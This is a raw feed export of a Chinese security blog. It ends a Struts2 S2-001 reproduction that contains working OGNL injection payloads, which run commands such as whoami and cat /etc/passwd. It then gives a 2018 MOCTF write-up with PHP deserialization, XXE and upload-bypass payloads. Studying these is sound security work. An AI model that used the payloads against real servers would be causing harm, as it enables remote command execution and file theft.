class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>S2-001<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello <span class="tag">&lt;<span class="name">s:property</span> <span class="attr">value</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;/<span class="name">s:property</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>struts.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> <span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></div><div class="line"><span class="meta">    "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></div><div class="line"><span class="meta">    "http://struts.apache.org/dtds/struts-2.0.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"S2-001"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"com.demo.action.LoginAction"</span>&gt;</span></div><div class="line">			<span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></div><div class="line">			<span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"error"</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></div><div class="line">		<span class="tag">&lt;/<span class="name">action</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">package</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>com.demo.action.LoginAction.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> com.demo.action;</div><div class="line"></div><div class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</div><div class="line">	<span class="keyword">private</span> String username = <span class="keyword">null</span>;</div><div class="line">	<span class="keyword">private</span> String password = <span class="keyword">null</span>;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.username;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.password;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</div><div class="line">		<span class="keyword">this</span>.username = username;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</div><div class="line">		<span class="keyword">this</span>.password = password;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">		<span class="keyword">if</span> ((<span class="keyword">this</span>.username.isEmpty()) || (<span class="keyword">this</span>.password.isEmpty())) &#123;</div><div class="line">			<span class="keyword">return</span> <span class="string">"error"</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span> ((<span class="keyword">this</span>.username.equalsIgnoreCase(<span class="string">"admin"</span>))</div><div class="line">				&amp;&amp; (<span class="keyword">this</span>.password.equals(<span class="string">"admin"</span>))) &#123;</div><div class="line">			<span class="keyword">return</span> <span class="string">"success"</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> <span class="string">"error"</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><h3 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=xishir&amp;password=%&#123;1+1&#125;</div></pre></td></tr></table></figure>
<p><img src="/img/s2/s2-001-2.png" alt=""></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p>è·å–tomcatæ‰§è¡Œè·¯å¾„ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</div></pre></td></tr></table></figure></p>
<p>è·å–Webè·¯å¾„ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()&#125;</div></pre></td></tr></table></figure></p>
<p>æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</div></pre></td></tr></table></figure></p>
<p>å¸¦å‚æ•°çš„å‘½ä»¤ï¼š<code>new java.lang.String[]{&quot;cat&quot;,&quot;/etc/passwd&quot;}</code><br><img src="/img/s2/s2-001-3.png" alt=""></p>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a><br><a href="http://rickgray.me/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">http://rickgray.me/review-struts2-remote-command-execution-vulnerabilities.html</a><br><a href="https://github.com/vulhub/vulhub/tree/master/struts2/s2-001" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/struts2/s2-001</a><br><a href="https://chybeta.github.io/2018/02/06/ã€struts2-å‘½ä»¤-ä»£ç æ‰§è¡Œæ¼æ´åˆ†æç³»åˆ—ã€‘S2-001/" target="_blank" rel="noopener">https://chybeta.github.io/2018/02/06/ã€struts2-å‘½ä»¤-ä»£ç æ‰§è¡Œæ¼æ´åˆ†æç³»åˆ—ã€‘S2-001/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘ç»å†äº†å‡ æ¬¡é¢è¯•ï¼Œæ·±è§‰åœ¨ä¼ä¸šä¸­ï¼Œjavaå®‰å…¨æ˜¯ååˆ†å—é‡è§†çš„ï¼Œäºæ˜¯æ‰“ç®—å¯¹javaå®‰å…¨è¿›è¡Œæ·±å…¥å­¦ä¹ ï¼Œæœ¬ç³»åˆ—æ˜¯å¯¹Struts2çš„æ¼æ´è¿›è¡Œåˆ†æä¸å¤ç°ï¼Œå†™çš„ä¸å¥½æ¬¢è¿å¤§å®¶æŒ‡å‡ºé—®é¢˜ï¼Œæœ¬æ–‡æ‰€æœ‰æºç ä¸poc&amp;amp;expï¼š&lt;a href=&quot;https://github.com/xishir/Struts2Vuls/tree/master/S2-001&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/xishir/Struts2Vuls/tree/master/S2-001&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="https://www.codemonster.cn/tags/RCE/"/>
    
      <category term="Struts2" scheme="https://www.codemonster.cn/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>2018 MOCTF æ–°æ˜¥æ¬¢ä¹èµ› éƒ¨åˆ†WriteUp+æ„Ÿæƒ³</title>
    <link href="https://www.codemonster.cn/2018/02/13/2018-moctf-happy-writeup/"/>
    <id>https://www.codemonster.cn/2018/02/13/2018-moctf-happy-writeup/</id>
    <published>2018-02-13T14:11:58.000Z</published>
    <updated>2018-07-28T06:19:47.791Z</updated>
    
    <content type="html"><![CDATA[<p>ä»æ”¾å‡åˆ°ç°åœ¨ç­¹åŠå‡†å¤‡äº†æ¥è¿‘ä¸¤ä¸ªæ˜ŸæœŸçš„MOCTFæ–°æ˜¥æ¬¢ä¹èµ›ç»ˆäºè½å¹•å•¦ï¼Œè¿™æ¬¡æ¯”èµ›æˆ‘ä¸€å…±å‡ºäº†1ç­¾åˆ°+1MISC+3WEBï¼Œä¸‹é¢å…ˆæ”¾å®˜æ–¹WriteUpï¼ˆå“‡ç»ˆäºèƒ½å½“ä¸€å›å®˜æ–¹äº†ï¼‰<br><a id="more"></a></p>
<h1 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h1><h3 id="ç­¾åˆ°-20"><a href="#ç­¾åˆ°-20" class="headerlink" title="ç­¾åˆ° 20"></a>ç­¾åˆ° 20</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">æ”¯ä»˜å®ä»Šå¹´é›†é½äº”ç¦èƒ½ä¸€èµ·å¹³åˆ†å¤šå°‘é’±ï¼Ÿ</div><div class="line">flagæ ¼å¼ï¼šmoctf&#123;æ•°å­—&#125;</div></pre></td></tr></table></figure>
<p>flag:moctf{500000000}</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="ç©ºword-100"><a href="#ç©ºword-100" class="headerlink" title="ç©ºword 100"></a>ç©ºword 100</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">çœŸçš„ä»€ä¹ˆéƒ½æ²¡æœ‰å—</div></pre></td></tr></table></figure>
<p>æ–‡ä»¶æ˜¯ä¸ªword<br>æ‰“å¼€çœ‹å‘ç°ä¸€äº›å¥‡æ€ªçš„æ¢è¡Œå’Œtab<br><img src="/img/2018moctf1.png" alt=""><br>å¾ˆå®¹æ˜“æƒ³åˆ°æ˜¯æ‘©æ–¯å¯†ç ï¼Œæ›¿æ¢åå¾—åˆ°<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-.... -.. -.... ..-. -.... ...-- --... ....- -.... -.... --... -... ....- ..--- -.... -.-. ...-- ....- -.... . -.... -... ..... ..-. ...-- ----- --... ..--- ..... ..-. --... ....- -.... .---- -.... ..--- ...-- ..-. --... -..</div></pre></td></tr></table></figure></p>
<p>è§£æ‘©æ–¯å¯†ç ï¼Œç„¶åhexè½¬å­—ç¬¦ä¸²å¾—åˆ°flag</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="ç™»å½•ä¸€å“ˆ-300"><a href="#ç™»å½•ä¸€å“ˆ-300" class="headerlink" title="ç™»å½•ä¸€å“ˆ 300"></a>ç™»å½•ä¸€å“ˆ 300</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ç™»å½•ä¸€ä¸‹ï¼Œä½ å°±çŸ¥é“ã€‚</div><div class="line">http://111.230.32.124:6001/</div></pre></td></tr></table></figure>
<p>æºç æ”¾åˆ°gité‡Œæ³„éœ²ç»™å¤§å®¶äº†<br>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_binary'</span>);</div><div class="line">    session_start();</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</div><div class="line">        $username = $_POST[<span class="string">'username'</span>];</div><div class="line">        $password = $_POST[<span class="string">'password'</span>];</div><div class="line">        $_SESSION[<span class="string">"username"</span>] = $username;</div><div class="line">        header(<span class="string">"Location:./index.php"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">"username"</span>]))&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;h1&gt;hello '</span>.$_SESSION[<span class="string">"username"</span>].<span class="string">'&lt;/h1&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> ...</div></pre></td></tr></table></figure></p>
<p>flag.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">session_start();</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MOCTF</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $flag;</div><div class="line">    <span class="keyword">public</span> $name;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;flag = <span class="string">"moctf&#123;xxxxxxxxxxxxxxxx&#125;"</span>;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;flag == <span class="keyword">$this</span>-&gt;name)&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Wow,this is flag:"</span>.<span class="keyword">$this</span>-&gt;flag;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>çœ‹æºç å°±å¯ä»¥çŸ¥é“è¿™é“é¢˜è€ƒæŸ¥çš„æ˜¯sessionååºåˆ—æ¼æ´äº†<br>åœ¨index.phpä¸­phpçš„åºåˆ—åŒ–handleræ˜¯â€™php_binaryâ€™ï¼Œè€Œflag.phpé‡Œæ²¡æœ‰è®¾ç½®ï¼Œå°±æ˜¯é»˜è®¤çš„â€™phpâ€™<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_binary'</span>);</div></pre></td></tr></table></figure></p>
<p>å‚è€ƒ<a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a><br>index.phpä¸­çš„<code>$_session[&#39;username&#39;]</code>å¯æ§ï¼Œæˆ‘ä»¬å°±èƒ½æ„é€ payloadåˆ°sessionï¼Œ<br>ç„¶åè®¿é—®flag.phpé¡µé¢å°±èƒ½è§¦å‘ååºåˆ—åŒ–æ‰§è¡Œ<code>__destruct</code>äº†ï¼Œ<br>è¿™é‡Œè¿˜æœ‰ä¸ªè€ƒç‚¹æ˜¯<code>$this-&gt;flag == $this-&gt;name</code>ï¼Œé€šè¿‡å¼•ç”¨çš„æ–¹å¼ç»•è¿‡ã€‚<br>æ„é€ payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$a = <span class="keyword">new</span> MOCTF();</div><div class="line">$a-&gt;name = &amp;$a-&gt;flag;</div><div class="line"><span class="keyword">echo</span> <span class="string">'|'</span>.serialize($a);</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">|O:5:&quot;MOCTF&quot;:2:&#123;s:4:&quot;flag&quot;;N;s:4:&quot;name&quot;;R:2;&#125;</div></pre></td></tr></table></figure>
<p>æäº¤åˆ°index.phpçš„usernameï¼Œç„¶åè®¿é—®flag.phpå°±å¾—åˆ°flagäº†</p>
<h3 id="å­—ç¬¦ä¸²æ£€æŸ¥-400"><a href="#å­—ç¬¦ä¸²æ£€æŸ¥-400" class="headerlink" title="å­—ç¬¦ä¸²æ£€æŸ¥ 400"></a>å­—ç¬¦ä¸²æ£€æŸ¥ 400</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">æ¥æ£€æŸ¥ä¸€ä¸‹ä½ çš„å­—ç¬¦ä¸²æ˜¯å¦æ ¼å¼è‰¯å¥½å§ï¼</div><div class="line">http://111.230.32.124:6002/</div></pre></td></tr></table></figure>
<p>åŸæ„æ˜¯xxeæ¼æ´è¯»å–ä»»æ„æ–‡ä»¶<br>åæ¥çŸ¥é“å¸ˆå‚…ä»¬å¡äº†å¾ˆä¹…è²Œä¼¼æ˜¯å› ä¸º<code>client-ip</code>çš„åŸå› ï¼Œæˆ‘çš„é”…<br>é¢˜ç›®æ‰“å¼€æ˜¯ä¸ªjsonå­—ç¬¦ä¸²éªŒè¯çš„é¡µé¢ï¼ŒPOSTåŒ…çš„<code>Content-Type</code>å­—æ®µæ˜¯<code>application/json</code>ï¼Œ<br>POSTåæ¥å£ä¼šè¿”å›jsonæ ¼å¼æ­£ç¡®æˆ–é”™è¯¯çš„ç»“æœ<br>æ”¹æˆ<code>application/xml</code>ï¼Œæ¥å£æç¤ºåªå…è®¸æœ¬æœºè®¿é—®ï¼Œäºæ˜¯æ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">client-ip:localhost</div></pre></td></tr></table></figure></p>
<p>ç„¶åå°±æ˜¯xxeç›²æ‰“æ¼æ´äº†ï¼Œå‚è€ƒ<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a><br>è¿™é‡Œæˆ‘åªé™åˆ¶äº†payloadé•¿åº¦ä¸º170ä»¥å†…ï¼Œå…¶å®å®Œå…¨å¯ä»¥æ›´çŸ­çš„ï¼Œå¸Œæœ›å¤§ä½¬ä»¬å¯ä»¥æµ‹è¯•æµ‹è¯•<br>æœ€åflagåœ¨/etc/passwd</p>
<h3 id="ç®€å•å®¡è®¡-400"><a href="#ç®€å•å®¡è®¡-400" class="headerlink" title="ç®€å•å®¡è®¡ 400"></a>ç®€å•å®¡è®¡ 400</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ä»£ç éƒ½ç»™ä½ äº†ï¼Œè¿˜è¯´ä¸ä¼šåšï¼Ÿ</div><div class="line">http://120.78.57.208:6005/</div></pre></td></tr></table></figure>
<p>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_rand_code</span><span class="params">($l = <span class="number">6</span>)</span> </span>&#123;</div><div class="line">    $result = <span class="string">''</span>;</div><div class="line">    <span class="keyword">while</span>($l--) &#123;</div><div class="line">        $result .= chr(rand(ord(<span class="string">'a'</span>), ord(<span class="string">'z'</span>)));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $result;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_rand_code</span><span class="params">()</span> </span>&#123;</div><div class="line">    $ip=$_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line">    $code=get_rand_code();</div><div class="line">    $socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</div><div class="line">    @socket_connect($socket, $ip, <span class="number">8888</span>);</div><div class="line">    @socket_write($socket, $code.PHP_EOL);</div><div class="line">    @socket_close($socket);</div><div class="line">    <span class="keyword">die</span>(<span class="string">'test ok!'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($filename, $content,$savepath)</span> </span>&#123;</div><div class="line">    $AllowedExt = <span class="keyword">array</span>(<span class="string">'bmp'</span>,<span class="string">'gif'</span>,<span class="string">'jpeg'</span>,<span class="string">'jpg'</span>,<span class="string">'png'</span>);</div><div class="line">    <span class="keyword">if</span>(!is_array($filename)) &#123;</div><div class="line">        $filename = explode(<span class="string">'.'</span>, $filename);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(!in_array(strtolower($filename[count($filename)<span class="number">-1</span>]),$AllowedExt))&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'error ext!'</span>);</div><div class="line">    &#125;</div><div class="line">    $code=get_rand_code();</div><div class="line">    $finalname=$filename[<span class="number">0</span>].<span class="string">'moctf'</span>.$code.<span class="string">"."</span>.end($filename);</div><div class="line">    file_put_contents(<span class="string">"$savepath"</span>.$finalname, $content);</div><div class="line">    usleep(<span class="number">3000000</span>);</div><div class="line">    unlink(<span class="string">"$savepath"</span>.$finalname);</div><div class="line">    <span class="keyword">die</span>(<span class="string">'upload over!'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$savepath=<span class="string">"uploads/"</span>.sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"/"</span>;</div><div class="line"><span class="keyword">if</span>(!is_dir($savepath))&#123;</div><div class="line">    $oldmask = umask(<span class="number">0</span>);</div><div class="line">    mkdir($savepath, <span class="number">0777</span>);</div><div class="line">    umask($oldmask);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))</div><div class="line">&#123;</div><div class="line">    $act=$_GET[<span class="string">'action'</span>];</div><div class="line">    <span class="keyword">if</span>($act===<span class="string">'upload'</span>)</div><div class="line">    &#123;</div><div class="line">        $filename=$_POST[<span class="string">'filename'</span>];</div><div class="line">        <span class="keyword">if</span>(!is_array($filename)) &#123;</div><div class="line">            $filename = explode(<span class="string">'.'</span>, $filename);</div><div class="line">        &#125;</div><div class="line">        $content=$_POST[<span class="string">'content'</span>];</div><div class="line">        waf($content);</div><div class="line">        upload($filename,$content,$savepath);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($act===<span class="string">'test'</span>)</div><div class="line">    &#123;</div><div class="line">        test_rand_code();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">    highlight_file(<span class="string">'index.php'</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>è§£é‡Šä¸€ä¸‹é¢˜ç›®çš„æ„æ€<br>æ ¹æ®actionæ‰§è¡Œå¯¹åº”æ“ä½œï¼Œ<code>action=test</code>ä¼šè°ƒç”¨<code>test_rand_code</code>å‡½æ•°å‘é€tcpåŒ…åˆ°è®¿å®¢çš„ip<br><code>action=upload</code>æ—¶ä¼šå†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹æœ‰wafæ‹¦æˆªï¼Œæ–‡ä»¶åæœ‰ç™½åå•é™åˆ¶åç¼€ï¼Œ<br>ç„¶åæ‹¼æ¥æ–‡ä»¶ååŠ å…¥randçš„å­—ç¬¦ä¸²ï¼Œå†™å…¥æ–‡ä»¶ï¼Œæ–‡ä»¶å†™å…¥åè¿‡3ç§’unlinkåˆ é™¤<br>æœ‰é—®é¢˜çš„ç‚¹æœ‰è¿™å‡ ä¸ª<br>1.filenameæ£€æŸ¥æ˜¯ç”¨<code>$filename[count($filename)-1]</code>å–çš„åç¼€ï¼Œæ˜¯æŒ‰ç…§ä¸‹æ ‡å–çš„ï¼Œè€Œå†™å…¥æ–‡ä»¶æ—¶ç”¨çš„æ˜¯<code>end($filename)</code>ï¼Œæ˜¯å–æœ€åä¸€ä¸ªå…ƒç´ ï¼Œåªè¦postæ—¶æäº¤<code>filename[1]=jpg&amp;filename[0]=php</code>å°±èƒ½ç»•è¿‡äº†<br>2.$contentçš„wafç»•è¿‡ï¼Œ<script language="php">xxxx</script> ç»•è¿‡å³å¯<br>3.ä½¿ç”¨rand()ç”Ÿæˆéšæœºæ•°ï¼Œå¯ä»¥è¢«é¢„æµ‹ï¼Œå‚è€ƒ<a href="https://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/" target="_blank" rel="noopener">https://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/</a></p>
